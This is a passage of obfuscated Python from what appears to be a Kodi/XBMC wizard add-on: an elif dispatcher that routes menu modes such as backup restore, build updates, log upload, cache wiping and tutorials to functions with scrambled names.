elif ooooOoo00 == 'hardware_final_menu' : i1iIIII1iiIIi ( o0O0OO0o )
elif ooooOoo00 == 'hardware_root_menu' : o0Iiii ( )
elif ooooOoo00 == 'helix' : o0oO00o ( )
elif ooooOoo00 == 'hide_passwords' : i11iI1 ( )
elif ooooOoo00 == 'ipcheck' : IIII1ii1 ( )
elif ooooOoo00 == 'instructions' : i1I11I ( )
elif ooooOoo00 == 'instructions_1' : i1i1I11i1I ( )
elif ooooOoo00 == 'instructions_2' : O0OoOOooO0O ( )
elif ooooOoo00 == 'instructions_3' : OOOO00o000o ( )
elif ooooOoo00 == 'instructions_4' : Instructions_4 ( )
elif ooooOoo00 == 'instructions_5' : Instructions_5 ( )
elif ooooOoo00 == 'instructions_6' : Instructions_6 ( )
elif ooooOoo00 == 'LocalGUIDialog' : Ii11IiI111 ( )
elif ooooOoo00 == 'log' : o0o ( )
elif ooooOoo00 == 'manual_search' : oOO0ooi1iiIIiII1 ( o0O0OO0o )
elif ooooOoo00 == 'manual_search_builds' : Manual_Search_Builds ( )
elif ooooOoo00 == 'news_root_menu' : Ii1I1IIIiI1i ( o0O0OO0o )
elif ooooOoo00 == 'news_menu' : oO0oo ( o0O0OO0o )
elif ooooOoo00 == 'notify_msg' : I11I111i1I1 ( o0O0OO0o )
elif ooooOoo00 == 'OSS' : Ooo ( ooooooo00o , o0O0OO0o , i1i1iII1 , IIIII1 )
elif ooooOoo00 == 'play_video' : yt . PlayVideo ( o0O0OO0o )
elif ooooOoo00 == 'platform_menu' : iI1I1IiIII ( o0O0OO0o )
elif ooooOoo00 == 'popular' : IiIiiI1ii111 ( )
elif ooooOoo00 == 'popularwizard' : I11IiI1i ( ooooooo00o , o0O0OO0o , i1i1iII1 , IIIII1 )
elif ooooOoo00 == 'register' : IiIiI ( )
elif ooooOoo00 == 'remove_addon_data' : oooOO ( )
elif ooooOoo00 == 'remove_addons' : IIIi11 ( o0O0OO0o )
elif ooooOoo00 == 'remove_build' : I11iiIi1i1IIi ( )
elif ooooOoo00 == 'remove_crash_logs' : O0oOOOO00oOOo ( )
elif ooooOoo00 == 'remove_packages' : Oo0OooIII11i1iI11 ( )
elif ooooOoo00 == 'remove_textures' : IIioo0OO ( )
elif ooooOoo00 == 'restore' : RESTORE ( )
elif ooooOoo00 == 'restore_backup' : oO00oOoo00o0 ( ooooooo00o , o0O0OO0o , IIIII1 )
elif ooooOoo00 == 'restore_community' : I1i111IiIiIi1 ( ooooooo00o , o0O0OO0o , oO00o0 , IIIII1 , i1i1ii1111i1i , O0oOoo0OoO0O , i1iiIIIi )
elif ooooOoo00 == 'restore_local_CB' : iiiiIo00 ( )
elif ooooOoo00 == 'restore_local_gui' : IIiii11ii1II1 ( )
elif ooooOoo00 == 'restore_openelec' : o0oOOoO000 ( o0O0OO0o , IIIII1 )
elif ooooOoo00 == 'restore_option' : OO0Oo00OO0oo ( )
elif ooooOoo00 == 'restore_zip' : oOOoO0O ( o0O0OO0o )
elif ooooOoo00 == 'runtest' : i1IiiI1 ( o0O0OO0o )
elif ooooOoo00 == 'search_addons' : OOO0 ( o0O0OO0o )
elif ooooOoo00 == 'search_builds' : o00oo0oO00OOo0oO ( o0O0OO0o )
elif ooooOoo00 == 'Search_Private' : Private_Search ( o0O0OO0o )
elif ooooOoo00 == 'showinfo' : Oo00oo0 ( o0O0OO0o )
elif ooooOoo00 == 'SortBy' : I1Iii ( BuildURL , type )
elif ooooOoo00 == 'speed_instructions' : Iii1IIII1Iii ( )
elif ooooOoo00 == 'speedtest_menu' : ooo0oOOOO00Oo ( )
elif ooooOoo00 == 'text_guide' : i1IIIII1 ( ooooooo00o , o0O0OO0o )
elif ooooOoo00 == 'tools' : ooO ( )
elif ooooOoo00 == 'tutorial_final_menu' : ii11 ( o0O0OO0o )
elif ooooOoo00 == 'tutorial_addon_menu' : Oo0OOOO0oOoo0 ( o0O0OO0o )
elif ooooOoo00 == 'tutorial_root_menu' : O00OOOo ( )
elif ooooOoo00 == 'unhide_passwords' : oo00o00O0 ( )
elif ooooOoo00 == 'update' : iIi1iIiIIII1iII1i ( )
elif ooooOoo00 == 'update_build' : OO0Oooo0oo ( OoOOo , o0O0OO0o , ooooOoo00 , i1i1iII1 , iii11i1IIII , oO00o0 , IIIII1 , i1i1ii1111i1i , O0oOoo0OoO0O , i1iiIIIi )
elif ooooOoo00 == 'uploadlog' : iI1IIi ( )
elif ooooOoo00 == 'user_info' : iII1I ( )
elif ooooOoo00 == 'wipetools' : OO00O00o0O ( )
elif ooooOoo00 == 'xbmc_menu' : iii1iII ( o0O0OO0o )
elif ooooOoo00 == 'xbmcversion' : ii1iIi1 ( o0O0OO0o )
elif ooooOoo00 == 'wipe_xbmc' : iIii111Ii ( )
xbmcplugin . endOfDirectory ( int ( sys . argv [ 1 ] ) ) # dd678faae9ac167bc83abf78e5cb2f3f0688d3a3
